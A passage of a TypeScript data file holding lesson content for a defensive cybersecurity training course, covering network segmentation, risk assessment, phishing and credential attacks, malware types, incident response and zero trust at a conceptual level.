            { id: 'chk-triangulate', label: 'TRIANGULATION' },
            { id: 'chk-analyst', label: 'ANALYST ACTION' },
          ],
        },
      ];
    }

    // 12. M02-U3-C2: Larger branch: VLANs, multiple access switches, server/network segments and central connectivity
    if (chId === 'M02-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SEGMENTATION',
          subPillar: 'VLAN LOGICAL BOUNDARIES',
          heading: 'VLANs: Creating Distinct Security Segments',
          paragraph1:
            'As the branch expands, Ravi introduces VLANs: "VLANs create logical separation, but enforcement also depends on routing and security controls."',
          paragraph2:
            'VLAN 10 isolates Staff Workstations; VLAN 20 isolates Core Servers; VLAN 30 isolates Guest Wi-Fi. Packets cannot jump between VLANs without passing through an authorized router or firewall.',
          techBoxTitle: 'TECH BOX: 802.1Q Virtual Local Area Networks [Details]',
          techBoxAnalogy: 'Like separate security badge zones in a research facility: green badges access the cafeteria, but only red badges open the laboratory doors.',
          techBoxDef: 'VLAN (IEEE 802.1Q) partitions a single physical network into multiple isolated broadcast domains at Layer 2 by inserting a 12-bit VLAN identifier tag.',
          techBoxWhy: 'Segmentation contains the blast radius of compromises: if a guest laptop on VLAN 30 is infected with ransomware, it cannot broadcast to staff computers on VLAN 10.',
          defaultAnimation: 'm02-vlan-segmentation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'vlan-staff', label: 'VLAN 10: STAFF' },
            { id: 'vlan-server', label: 'VLAN 20: SERVERS' },
            { id: 'vlan-guest', label: 'VLAN 30: GUEST' },
            { id: 'vlan-mgmt', label: 'VLAN 99: MGMT' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TRUNKING',
          subPillar: 'MULTI-SWITCH HIERARCHY & TRUNKS',
          heading: '802.1Q Trunks: Multiplexing Across Access Switches',
          paragraph1:
            'Floor 1 and Floor 2 access switches connect back to the core distribution router via 802.1Q Trunk lines. Each frame carries a 4-byte tag identifying its originating VLAN.',
          paragraph2:
            'Trunks allow VLAN 10 traffic on Floor 1 to reach VLAN 10 printers on Floor 2 across shared physical fiber lines without crossing into other departments.',
          techBoxTitle: 'TECH BOX: 802.1Q Trunking & Core-Distribution Hierarchy [Details]',
          techBoxAnalogy: 'Like multi-compartment cargo trains: cars painted blue carry staff mail, while locked armored cars carry server data along the same railway tracks.',
          techBoxDef: 'Trunking is a point-to-point link carrying traffic for multiple VLANs simultaneously across switches using IEEE 802.1Q encapsulation tags.',
          techBoxWhy: 'VLAN hopping attacks (Double Tagging) attempt to bypass switch security by crafting nested tags to inject frames into unauthorized VLANs.',
          defaultAnimation: 'm02-multi-switch-trunk' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'trunk-acc1', label: 'ACCESS SW 1' },
            { id: 'trunk-acc2', label: 'ACCESS SW 2' },
            { id: 'trunk-dot1q', label: '802.1Q TRUNK' },
            { id: 'trunk-core', label: 'CORE ROUTER' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: BOUNDARY AUDIT',
          subPillar: 'LATERAL MOVEMENT DETECTION',
          heading: 'Boundary Audits: Catching Cross-VLAN Violations',
          paragraph1:
            'Learner asks: "Does drawing different colors around devices secure them?" Ravi smiles: "No. We must know which paths are actually allowed and where controls enforce policy."',
          paragraph2:
            'When an untrusted device on Guest VLAN 30 initiates an SSH probe (Port 22) directly to Management VLAN 99, the inter-VLAN firewall drops the connection and raises an urgent Lateral Movement alert!',
          techBoxTitle: 'TECH BOX: Inter-VLAN ACLs & Lateral Movement [Details]',
          techBoxAnalogy: 'Like testing building fire doors: the doors must remain locked against unauthorized trespassers even if someone manages to climb into the garden.',
          techBoxDef: 'Inter-VLAN Access Control Lists (ACLs) restrict packet flow between segmented virtual networks, enforcing strict zero-trust boundary policies.',
          techBoxWhy: 'Ravi\'s golden rule: "Should you change a production rule just because a diagram looks wrong? No. Document the concern and involve the authorized network owner."',
          defaultAnimation: 'm02-vlan-boundary-audit' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'audit-guest', label: 'GUEST PROBE' },
            { id: 'audit-block', label: 'FIREWALL BLOCK' },
            { id: 'audit-mgmt', label: 'MGMT VLAN 99' },
            { id: 'audit-alert', label: 'LATERAL ALERT ⚠️' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 03: CYBERSECURITY FUNDAMENTALS (Mentor Ananya)
    // =========================================================================

    // 1. M03-U1-C1: Assets, threats and vulnerabilities
    if (chId === 'M03-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ASSETS',
          subPillar: 'ASSET CLASSIFICATION & CROWN JEWELS',
          heading: 'Asset Classification & The Crown Jewels',
          paragraph1:
            'Mentor Ananya opens the branch asset registry. Before a security team can defend an enterprise, they must know exactly what they are protecting—from mission-critical database servers to ordinary office terminals.',
          paragraph2:
            'Not all assets possess equal value. While a reception kiosk holds no proprietary data, the core PostgreSQL database contains employee salaries and banking details. Analysts prioritize defense based on asset criticality.',
          techBoxTitle: 'TECH BOX: Asset Valuation & Data Sensitivity [Details]',
          techBoxAnalogy: 'Like a museum where the master Kohinoor diamond is kept inside reinforced biometric vaults, while informational brochures sit freely on lobby desks.',
          techBoxDef: 'Asset Classification (ISO/IEC 27001 A.8) categorizes digital assets according to their legal, financial, and operational value to ensure proportional protective controls.',
          techBoxWhy: 'Alerts involving Tier 1 Crown Jewel assets demand immediate 15-minute triage SLAs, whereas alerts on isolated test devices can follow routine queues.',
          defaultAnimation: 'm03-asset-inventory' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'asset-crown', label: 'FIN-DB-01 👑' },
            { id: 'asset-dc', label: 'DOMAIN CTRL' },
            { id: 'asset-endpoint', label: 'WORKSTATION' },
            { id: 'asset-kiosk', label: 'KIOSK (LOW)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: THREATS & VULNS',
          subPillar: 'RISK COLLISION & INTERSECTION',
          heading: 'Threat Actors vs System Vulnerabilities',
          paragraph1:
            'Ananya illustrates a fundamental truth: a threat actor is an external entity that could cause harm, whereas a vulnerability is an internal flaw or weakness waiting to be exploited.',
          paragraph2:
            'Risk only exists at the intersection where a threat meets a vulnerability. If an unpatched service (vulnerability) is patched or shielded behind a firewall, the threat actor\'s automated probes fail harmlessly.',
          techBoxTitle: 'TECH BOX: Threat Modeling & Vulnerability Management [Details]',
          techBoxAnalogy: 'A burglar walking down the street is a threat; an unlocked front window is a vulnerability. Risk occurs only when the burglar finds the unlocked window. Locking the window eliminates the risk.',
          techBoxDef: 'Vulnerability (NIST SP 800-30) is a flaw or weakness in system security procedures, design, or implementation that could be exercised by a threat event.',
          techBoxWhy: 'Adversaries scan thousands of IPs per hour looking for known CVEs. Rapid 72-hour patching closes the vulnerability window before weaponized exploits land.',
          defaultAnimation: 'm03-threat-vuln-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tv-threat', label: 'THREAT ACTOR' },
            { id: 'tv-vuln', label: 'VULNERABILITY' },
            { id: 'tv-intersection', label: 'ACTIVE EXPLOIT 🔥' },
            { id: 'tv-shield', label: 'PATCH SHIELD ✓' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FORENSICS',
          subPillar: 'DISAMBIGUATING PERSON VS CREDENTIAL',
          heading: 'The Human Person vs The Credential Token',
          paragraph1:
            'Mentor Ananya shares her core operational doctrine: "An account identifier is a credential token, not physical proof of a person." Just because FIN-OPS-01 was used at 02:45 AM does not mean employee Ramesh was typing.',
          paragraph2:
            'Credentials can be stolen by infostealers, phished, or automated by scripts. Professional analysts document technical observables objectively, maintaining forensic restraint rather than rushing to personal blame.',
          techBoxTitle: 'TECH BOX: Forensic Restraint & Entity Resolution [Details]',
          techBoxAnalogy: 'If a burglar steals a resident\'s house key and enters at night, the door lock recorded a valid key entry, but the homeowner was not the burglar.',
          techBoxDef: 'Entity Disambiguation (ISO/IEC 27037) separates the recorded digital credential from the physical human actor until corroborating multi-source evidence is verified.',
          techBoxWhy: 'Accusing an employee prematurely causes severe workplace distress and distracts the SOC from pursuing the actual remote adversary.',
          defaultAnimation: 'm03-person-vs-credential' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ent-person', label: 'RAMESH (PERSON)' },
            { id: 'ent-credential', label: 'FIN-OPS-01 (KEY)' },
            { id: 'ent-device', label: 'WS-04 (DEVICE)' },
            { id: 'ent-forensic', label: 'RESTRAINT ✓' },
          ],
        },
      ];
    }

    // 2. M03-U1-C2: Risk, impact and likelihood
    if (chId === 'M03-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CIA TRIAD',
          subPillar: 'CONFIDENTIALITY, INTEGRITY & AVAILABILITY',
          heading: 'The CIA Triad: Balancing Three Core Pillars',
          paragraph1:
            'Every security incident impacts one or more legs of the CIA Triad: Confidentiality (keeping secrets private), Integrity (preventing unauthorized tampering), or Availability (ensuring systems remain operational).',
          paragraph2:
            'Ananya explains that different attacks strike different pillars: a data breach compromises confidentiality, silent ledger modifications destroy integrity, and ransomware destroys both integrity and availability.',
          techBoxTitle: 'TECH BOX: CIA Triad Objectives & Standards [Details]',
          techBoxAnalogy: 'Like personal banking: keeping your balance hidden from strangers (Confidentiality), ensuring no one edits your deposit numbers (Integrity), and having the ATM work when you need cash (Availability).',
          techBoxDef: 'CIA Triad (NIST SP 800-53) represents the foundational security model governing policies for data privacy, trustworthiness, and service uptime.',
          techBoxWhy: 'Determines response strategy: a confidentiality incident requires exfiltration analysis, while an availability incident focuses on failover and recovery.',
          defaultAnimation: 'm03-cia-triad' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cia-conf', label: 'CONFIDENTIALITY' },
            { id: 'cia-integ', label: 'INTEGRITY' },
            { id: 'cia-avail', label: 'AVAILABILITY' },
            { id: 'cia-balance', label: 'TRIAD BALANCE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: RISK MATRIX',
          subPillar: 'LIKELIHOOD VS IMPACT HEATMAP',
          heading: 'The 5x5 Qualitative Risk Matrix & Likelihood',
          paragraph1:
            'Security teams cannot fix every flaw simultaneously; they use the Risk Formula (Risk = Likelihood x Impact) plotted across a 5x5 heatmap to prioritize incidents logically.',
          paragraph2:
            'Likelihood measures how easily an adversary can reach and trigger a flaw; Impact measures the financial, operational, and reputational damage if the breach succeeds.',
          techBoxTitle: 'TECH BOX: Qualitative Risk Scoring & Heatmaps [Details]',
          techBoxAnalogy: 'A small scratch on an everyday bicycle has low impact and low cost; engine failure on a passenger aircraft has catastrophic impact and requires immediate grounded inspection.',
          techBoxDef: 'Risk Assessment (NIST SP 800-30) combines threat likelihood with potential organizational impact to categorize risks into Low, Medium, High, and Critical bands.',
          techBoxWhy: 'Allows L1 analysts to justify why a high-impact alert must interrupt senior management while low-impact probes are logged routinely.',
          defaultAnimation: 'm03-risk-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'risk-mat-low', label: 'LOW RISK 🟢' },
            { id: 'risk-mat-med', label: 'MEDIUM 🟡' },
            { id: 'risk-mat-high', label: 'HIGH 🟠' },
            { id: 'risk-mat-crit', label: 'CRITICAL 🔴' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: BUSINESS CONTEXT',
          subPillar: 'TRIAGE TRIANGULATION & SLA',
          heading: 'Business Context Triage Triangulation',
          paragraph1:
            'Ananya shows the learner two identical port-scan alerts in the SIEM: Alert #101 targets the public lobby kiosk, while Alert #102 targets the core finance database server holding enterprise payroll records.',
          paragraph2:
            'Though the technical network packets are identical, the business impact is vastly different. Alert #101 is routine SEV-4 (24h SLA); Alert #102 is an emergency SEV-1 Critical demanding immediate 15-minute escalation.',
          techBoxTitle: 'TECH BOX: Business Impact Analysis & SLA Assignment [Details]',
          techBoxAnalogy: 'A trespasser climbing over the garden fence of a vacant storage shed versus a trespasser climbing the security fence of the central gold vault.',
          techBoxDef: 'Business Impact Analysis (BIA) correlates raw technical telemetry with operational dependencies to establish incident severity and response timeframes.',
          techBoxWhy: 'Prevents SOC alert paralysis: analysts never evaluate network packets in a vacuum without consulting the business asset catalog.',
          defaultAnimation: 'm03-business-impact-gauge' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'bia-kiosk', label: 'LOBBY KIOSK (LOW)' },
            { id: 'bia-payroll', label: 'PAYROLL DB (SEV-1)' },
            { id: 'bia-sla', label: 'SLA SPEEDS' },
            { id: 'bia-matrix', label: 'DOCTRINE' },
          ],
        },
      ];
    }

    // 3. M03-U2-C1: Phishing and credential attacks
    if (chId === 'M03-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PHISHING ANATOMY',
          subPillar: 'DECEPTIVE LURES & HEADERS',
          heading: 'Anatomy of a Deceptive Phishing Lure',
          paragraph1:
            'Ananya displays a realistic phishing message targeting CDAC branch staff. Phishing exploits psychological human tendencies—urgency, fear, or curiosity—to trick users into clicking harmful links.',
          paragraph2:
            'L1 analysts dissect email artifacts: checking envelope sender domains against spoofed display names, evaluating artificial 2-hour deadlines, and inspecting mismatched hyperlinks without clicking them.',
          techBoxTitle: 'TECH BOX: Email Authentication (SPF, DKIM, DMARC) [Details]',
          techBoxAnalogy: 'Like a fake delivery driver wearing a hand-drawn courier badge demanding you open your front door immediately to sign for a package you never ordered.',
          techBoxDef: 'Phishing (CISA / MITRE T1566) is a social engineering attack where adversaries pose as trusted entities to steal credentials or distribute malware.',
          techBoxWhy: 'Over 85% of enterprise data breaches originate with a single successful phishing email bypassing human vigilance.',
          defaultAnimation: 'm03-phishing-anatomy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'phish-sender', label: 'SPOOFED SENDER' },
            { id: 'phish-urgency', label: 'URGENCY LURE' },
            { id: 'phish-link', label: 'MISMATCHED URL' },
            { id: 'phish-report', label: 'SOC REPORT ✓' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CREDENTIAL ATTACKS',
          subPillar: 'SPRAYING, STUFFING & BRUTE FORCE',
          heading: 'Credential Attacks: Brute Force, Spraying & Stuffing',
          paragraph1:
            'When attackers target corporate passwords, they choose between speed and stealth. Brute force hammers one account rapidly; password spraying tests one common password across 500 accounts to avoid lockouts.',
          paragraph2:
            'Credential stuffing exploits password reuse by injecting credentials leaked from third-party breaches. Analysts correlate Windows Event ID 4625 logs across the Active Directory to detect distributed sprays.',
          techBoxTitle: 'TECH BOX: Password Spraying & Event 4625 Correlation [Details]',
          techBoxAnalogy: 'A burglar trying 1,000 keys on one front door (Brute Force) vs trying one master skeleton key on every front door on the entire street (Password Spray).',
          techBoxDef: 'Password Spraying (MITRE T1110.003) tests a small list of commonly used passwords against many accounts to evade individual account lockout thresholds.',
          techBoxWhy: 'Individual workstations may show only 1 failed logon, but cross-tenant SIEM correlation reveals 500 simultaneous failures across the enterprise.',
          defaultAnimation: 'm03-credential-attack-sim' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cred-brute', label: 'BRUTE FORCE' },
            { id: 'cred-spray', label: 'PASSWORD SPRAY' },
            { id: 'cred-stuff', label: 'STUFFING' },
            { id: 'cred-event', label: 'EVENT ID 4625' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MFA DEFENSE',
          subPillar: 'PUSH FATIGUE & FIDO2 CHALLENGE',
          heading: 'MFA Push Fatigue & Number Matching Defense',
          paragraph1:
            'If an attacker steals a valid password, Multi-Factor Authentication (MFA) stands in their path. Adversaries attempt MFA Push Bombing—spamming 50 mobile push prompts at 03:00 AM hoping for an accidental tap.',
          paragraph2:
            'Modern defensive engineering neutralizes fatigue attacks through Number Matching and FIDO2 hardware keys: requiring the employee to type a 2-digit code displayed on the login screen into their authenticator app.',
          techBoxTitle: 'TECH BOX: Phishing-Resistant MFA & Number Matching [Details]',
          techBoxAnalogy: 'Instead of an open buzzer where someone rings your doorbell 50 times until you buzz them in, the visitor must read a secret pass-number through a keyhole.',
          techBoxDef: 'MFA Fatigue (MITRE T1621) coerces users into approving malicious prompts. Number Matching (NIST SP 800-63B) eliminates prompt bombing by enforcing origin validation.',
          techBoxWhy: 'Stops sophisticated credential brokers from bypassing dual-factor perimeters without requiring complex password changes.',
          defaultAnimation: 'm03-mfa-fatigue-radar' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mfa-bomb', label: 'PUSH BOMBING' },
            { id: 'mfa-number', label: 'NUMBER MATCH ✓' },
            { id: 'mfa-fido2', label: 'FIDO2 TOKEN' },
            { id: 'mfa-policy', label: 'CONDITIONAL' },
          ],
        },
      ];
    }

    // 4. M03-U2-C2: Malware, insider and network threats
    if (chId === 'M03-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: MALWARE',
          subPillar: 'TAXONOMY & EXECUTION VECTORS',
          heading: 'Malware Taxonomy: Ransomware, Trojans & Stealers',
          paragraph1:
            'Mentor Ananya introduces the four major malware families encountered on branch endpoints: destructive Ransomware, deceptive Trojan droppers, stealthy InfoStealers, and self-replicating network Worms.',
          paragraph2:
            'Each malware class leaves unique footprints: ransomware deletes volume shadow copies and appends .locked extensions, while infostealers silently dump browser SQLite cookie vaults to exfiltrate session tokens.',
          techBoxTitle: 'TECH BOX: Malware Behaviors & EDR Signatures [Details]',
          techBoxAnalogy: 'A Trojan is a hollow wooden horse sneaking soldiers inside; Ransomware is a gang padlocking all office filing cabinets and demanding payment for the keys.',
          techBoxDef: 'Malware (NIST SP 800-83) is software or firmware intended to perform an unauthorized process that will have an adverse impact on the confidentiality, integrity, or availability of an information system.',
          techBoxWhy: 'Identifying the malware family guides containment: infostealers require immediate enterprise-wide password resets; ransomware demands instant network isolation.',
          defaultAnimation: 'm03-malware-taxonomy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mal-ransom', label: 'RANSOMWARE 🦠' },
            { id: 'mal-trojan', label: 'TROJAN 🪤' },
            { id: 'mal-stealer', label: 'INFOSTEALER 👁️' },
            { id: 'mal-worm', label: 'SMB WORM 🐛' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: INSIDER TRIAGE',
          subPillar: 'FACTS VS PREMATURE ACCUSATIONS',
          heading: 'Insider Threat Triage: Fact vs Presumption',
          paragraph1:
            'Ananya examines an alert showing 45 GB of financial archives copied to a USB drive at 23:45 UTC under account FIN-OPS-01. A novice might assume employee Ramesh is stealing secrets.',
          paragraph2:
            'Disciplined analysts verify physical turnstile logs first. If Ramesh never swiped into the building, the workstation was compromised remotely by an external trojan. Investigating facts prevents false accusations.',
          techBoxTitle: 'TECH BOX: Multi-Source Correlation & DLP Controls [Details]',
          techBoxAnalogy: 'Finding footprints outside your house doesn\'t prove your neighbor visited; you must check the gate camera to see who actually walked there.',
          techBoxDef: 'Insider Threat Analysis correlates physical telemetry (RFID badges, CCTV) with digital audit trails (DLP, VPN) to determine whether actions reflect insider malice or compromised credentials.',
          techBoxWhy: 'Preserves professional workplace trust while ensuring investigators hunt the true remote attacker rather than scapegoating victim employees.',
          defaultAnimation: 'm03-insider-threat-indicators' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'insider-bulk', label: '45GB USB FACT' },
            { id: 'insider-badge', label: 'BADGE AUDIT' },
            { id: 'insider-presume', label: 'FALLACY TRAP' },
            { id: 'insider-dlp', label: 'DLP POLICY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: RECONNAISSANCE',
          subPillar: 'NETWORK PORT PROBING & IDS',
          heading: 'Network Reconnaissance & Port Sweep Detection',
          paragraph1:
            'Before adversaries launch exploits, they map the target network using reconnaissance scanners (such as Nmap). They send rapid half-open TCP SYN probes across common ports (22, 80, 445, 3389).',
          paragraph2:
            'Intrusion Detection Systems (Suricata, Zeek) monitor packet flow rates. When a single IP address touches dozens of destination ports within seconds, high-priority scan signatures alert the SOC.',
          techBoxTitle: 'TECH BOX: Network Sweeps & Intrusion Detection Signatures [Details]',
          techBoxAnalogy: 'A prowler walking down an apartment hallway jiggling every door handle to see which rooms are left unlocked.',
          techBoxDef: 'Network Reconnaissance (MITRE T1046) sweeps IP ranges and port listeners to discover active services, operating system versions, and attack surfaces.',
          techBoxWhy: 'Catching an attacker in the reconnaissance phase allows L1 analysts to ban the source IP before any weaponized exploit payload is delivered.',
          defaultAnimation: 'm03-network-recon-scanner' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'scan-syn', label: 'SYN SWEEP' },
            { id: 'scan-zeek', label: 'ZEEK ALERT' },
            { id: 'scan-honeypot', label: 'HONEYPOT PORT' },
            { id: 'scan-triage', label: 'RECON TRIAGE' },
          ],
        },
      ];
    }

    // 5. M03-U3-C1: Prevention, detection and response
    if (chId === 'M03-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CONTROLS TRIAD',
          subPillar: 'STOP, NOTICE & RESPOND',
          heading: 'Defensive Controls: Prevention, Detection & Response',
          paragraph1:
            'Defending enterprise systems relies on a triad of complementary control types: Preventive controls stop attacks before entry; Detective controls spot attacks in progress; Responsive controls contain damage.',
          paragraph2:
            'Ananya emphasizes: "Prevention without monitoring is blind optimism; detection without response is useless paperwork." All three pillars must synchronize seamlessly to protect the organization.',
          techBoxTitle: 'TECH BOX: Security Control Categories (NIST SP 800-53) [Details]',
          techBoxAnalogy: 'A locked vault door (Prevention), motion sensors and cameras in the hallway (Detection), and armed guards rushing to contain the alarm (Response).',
          techBoxDef: 'Security Controls are technical, operational, and management safeguards applied to an information system to protect confidentiality, integrity, and availability.',
          techBoxWhy: 'Ensures layered defense: even when a firewall rule fails to block an exploit, behavioral EDR sensors detect the payload, and automated response isolates the host.',
          defaultAnimation: 'm03-defense-triad' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ctrl-prev', label: 'PREVENTIVE' },
            { id: 'ctrl-det', label: 'DETECTIVE' },
            { id: 'ctrl-resp', label: 'RESPONSIVE' },
            { id: 'ctrl-triad-harmony', label: 'HARMONY ✓' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: INCIDENT LIFECYCLE',
          subPillar: 'NIST SP 800-61 STEP-BY-STEP',
          heading: 'Incident Response Lifecycle: NIST SP 800-61',
          paragraph1:
            'When an intrusion occurs, analysts follow the standardized NIST Incident Handling lifecycle: Preparation &rarr; Detection & Analysis &rarr; Containment, Eradication & Recovery &rarr; Post-Incident Lessons Learned.',
          paragraph2:
            'Preparation establishes pre-approved SOP playbooks so analysts do not freeze during crisis; containment halts adversary spread while eradication purges malware root causes completely.',
          techBoxTitle: 'TECH BOX: Standardized Incident Response Phases [Details]',
          techBoxAnalogy: 'Hospital emergency procedures: preparing sterile trauma bays (Prep), diagnosing the injury (Detection), stopping the bleeding (Containment), and therapy to prevent relapse (Lessons).',
          techBoxDef: 'Incident Response Lifecycle (NIST SP 800-61r2) provides an empirical, systematic framework for coordinating incident qualification, evidence acquisition, and recovery.',
          techBoxWhy: 'Gives L1 analysts structured decision authority so every alert is triaged methodically rather than through improvised guesses.',
          defaultAnimation: 'm03-incident-lifecycle' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ir-prep', label: 'PREPARATION' },
            { id: 'ir-detect', label: 'DETECTION' },
            { id: 'ir-contain', label: 'CONTAINMENT' },
            { id: 'ir-erad-rec', label: 'RECOVERY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: CONTAINMENT HUD',
          subPillar: 'ACTIVE QUARANTINE WORKFLOW',
          heading: 'Active Incident Containment Cockpit',
          paragraph1:
            'Ananya teaches the apprentice: "Detection is not containment. An alert is merely a request for attention until decisive containment action is executed."',
          paragraph2:
            'From the L1 containment cockpit, an analyst can sever workstation network traffic via EDR isolation and revoke compromised Kerberos session tokens within seconds of validating an active intrusion.',
          techBoxTitle: 'TECH BOX: Endpoint Isolation & Session Revocation [Details]',
          techBoxAnalogy: 'Hitting the emergency fire alarm button that drops fireproof steel blast doors around an isolated room to keep smoke from spreading through the entire building.',
          techBoxDef: 'Host Network Isolation instructs endpoint kernel drivers to drop all non-management packets, severing attacker command-and-control while preserving forensic memory state.',
          techBoxWhy: 'Contains active ransomware or lateral movement within minutes, saving hundreds of neighbouring branch workstations from compromise.',
          defaultAnimation: 'm03-alert-containment' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'act-alert', label: 'INTRUSION ALARM' },
            { id: 'act-isolate', label: 'ISOLATE HOST' },
            { id: 'act-revoke', label: 'REVOKE TOKEN' },
            { id: 'act-handover', label: 'TIER 2 HANDOFF' },
          ],
        },
      ];
    }

    // 6. M03-U3-C2: Least privilege and defense in depth
    if (chId === 'M03-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: DEFENSE IN DEPTH',
          subPillar: 'CONCENTRIC CASTLE RINGS',
          heading: 'Defense-in-Depth: Concentric Protective Rings',
          paragraph1:
            'Never rely on a single protective wall. Defense-in-depth deploys multiple overlapping defensive rings around enterprise data: Perimeter Firewalls, Network VLANs, Host EDR, Application RBAC, and Database Encryption.',
          paragraph2:
            'If an attacker finds a zero-day flaw in the perimeter firewall (Ring 5), internal network segmentation (Ring 4) stops them from reaching the database, and local EDR (Ring 3) catches their exploit process.',
          techBoxTitle: 'TECH BOX: Layered Security Architecture [Details]',
          techBoxAnalogy: 'A medieval castle: an outer water moat, thick stone ramparts, an iron portcullis, armed guards in the courtyard, and a reinforced treasure keep in the center.',
          techBoxDef: 'Defense-in-Depth (NIST SP 800-53) implements multiple layers of defensive mechanisms so that if any individual control is circumvented, backup controls impede the adversary.',
          techBoxWhy: 'Guarantees that a single unpatched laptop or compromised password cannot bring down the entire corporate enterprise.',
          defaultAnimation: 'm03-defense-in-depth-castle' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'did-perimeter', label: 'PERIMETER (NGFW)' },
            { id: 'did-network', label: 'NETWORK (VLAN)' },
            { id: 'did-endpoint', label: 'HOST (EDR)' },
            { id: 'did-data', label: 'VAULT (CORE)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: LEAST PRIVILEGE',
          subPillar: 'BLAST RADIUS CONTAINMENT',
          heading: 'Least Privilege & Blast Radius Containment',
          paragraph1:
            'The Principle of Least Privilege (PoLP) dictates that users and processes receive only the bare minimum permissions necessary to complete their job—never permanent administrative privileges.',
          paragraph2:
            'Ananya contrasts blast radiuses: when a standard user is compromised, malware is trapped in their personal profile folder; when a local administrator is compromised, malware wipes the entire enterprise disk.',
          techBoxTitle: 'TECH BOX: Principle of Least Privilege & Blast Radius [Details]',
          techBoxAnalogy: 'Handing a hotel guest a keycard that opens only their room #204, rather than giving every guest a master skeleton key that opens every bedroom in the building.',
          techBoxDef: 'Principle of Least Privilege (NIST SP 800-53 AC-6) restricts security privileges to the minimum needed to perform authorized activities, severely constraining compromise blast radiuses.',
          techBoxWhy: 'Eliminating local admin rights neutralizes over 80% of critical Microsoft vulnerabilities before any patch is even deployed.',
          defaultAnimation: 'm03-least-privilege-blast-radius' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'blast-user', label: 'STANDARD (SAFE)' },
            { id: 'blast-admin', label: 'ADMIN (DANGER) ⚠️' },
            { id: 'blast-uac', label: 'UAC GATE' },
            { id: 'blast-jit', label: 'JIT ACCESS' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ZERO TRUST',
          subPillar: 'CONTINUOUS EXPLICIT VERIFICATION',
          heading: 'Zero Trust: Explicit & Continuous Verification',
          paragraph1:
            'Legacy architectures trusted any device plugged into the internal branch LAN. Modern Zero Trust Architecture (NIST SP 800-207) enforces a strict doctrine: "Never Trust, Always Verify."',
          paragraph2:
            'Every single access request is evaluated dynamically: User Identity (MFA verified), Device Posture (EDR sensor healthy and disk encrypted), and Contextual Risk before granting microsegmented access.',
          techBoxTitle: 'TECH BOX: Zero Trust Architecture & Continuous Evaluation [Details]',
          techBoxAnalogy: 'Instead of showing an ID badge once at the front building lobby and wandering freely everywhere, you must scan your badge and fingerprint at every single office door you enter.',
          techBoxDef: 'Zero Trust (NIST SP 800-207) assumes breach and verifies each transaction explicitly, dynamically computing risk based on user, device, network, and workload posture.',
          techBoxWhy: 'Eliminates the concept of an "internal trusted network", stopping lateral movement even if an attacker plugs a rogue laptop into the office switch.',
          defaultAnimation: 'm03-zero-trust-verification' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'zt-verify', label: 'EXPLICIT IDENTITY' },
            { id: 'zt-device', label: 'DEVICE POSTURE' },
            { id: 'zt-micro', label: 'MICROSEGMENT' },
            { id: 'zt-pep', label: 'DECISION ENGINE' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 04: SOC OPERATIONS & ALERT TRIAGE (CDAC Bengaluru Training SOC)
    // =========================================================================

    // 1. M04-U1-C1: L1/L2/L3 roles and mentor handoffs
    if (chId === 'M04-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SOC ROLES',
          subPillar: 'L1, L2, L3 & LEAD ANANYA',
          heading: 'SOC Tier Hierarchy & Operational Boundaries',
          paragraph1:
            'Mentor Ananya opens the simulated monitoring queue at the CDAC Bengaluru observation desk: "You now know the basic environment. L1 usually validates alerts, gathers context, documents, and escalates under local procedures."',
          paragraph2:
            'When the learner asks if L2 and L3 always do identical jobs everywhere, Ananya clarifies: "No. Team structures differ. In our training model, deeper host forensics and specialist threat hunting have separate dedicated owners."',
          techBoxTitle: 'TECH BOX: Tiered Responsibilities & Authority Boundaries [Details]',
          techBoxAnalogy:
            'Like a hospital emergency department: the triage nurse (L1) evaluates incoming vitals, the trauma physician (L2) performs specialized surgery, and the epidemiologist (L3) tracks outbreak vectors.',
          techBoxDef:
